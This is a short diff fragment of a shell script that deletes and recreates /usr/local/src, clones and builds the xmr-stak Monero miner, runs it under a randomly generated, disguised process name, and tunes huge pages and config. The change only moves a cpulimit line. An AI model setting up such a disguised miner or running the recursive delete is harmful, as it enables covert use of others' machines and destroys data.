@@ -8,13 +8,13 @@ rm -r /usr/local/src
 mkdir /usr/local/src
 git clone https://github.com/fireice-uk/xmr-stak.git /usr/local/src &&
 a='nwmtjxvcxt-00' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
-sudo cpulimit --exe "$cpuname" -l 300 &&
 cd /usr/local/src
 mkdir build
 cd build 
 cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF
 make install
 cd bin/ &&
+sudo cpulimit --exe "$cpuname" -l 300 &&
 sudo sysctl -w vm.nr_hugepages=128 &&
 sudo bash -c 'cat <<EOT >>/usr/local/src/build/bin/config.txt
 "call_timeout" : 10,
